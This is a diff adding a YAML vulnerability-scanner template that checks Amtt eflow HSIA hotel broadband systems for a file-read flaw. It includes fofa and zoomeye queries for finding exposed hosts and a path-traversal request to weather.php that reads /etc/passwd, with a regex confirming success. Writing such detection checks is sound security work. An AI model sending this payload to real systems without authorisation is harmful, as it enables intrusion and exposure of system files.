@@ -1,0 +1,22 @@
+id: amtt-eflow-hsia-weather-fileread
+
+info:
+  name: Amtt eflow Hsia Weather File Read
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    fofa: title="酒店宽带运营系统"
+    zoomeye: app="安美数字酒店宽带运营系统"
+  reference:
+    - https://amttgroup.com/product-01-HSIA.html
+  tags: amtt,eflow,hsia,fileread
+  created: 2025/10/27
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /user/weather.php?Lang=../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
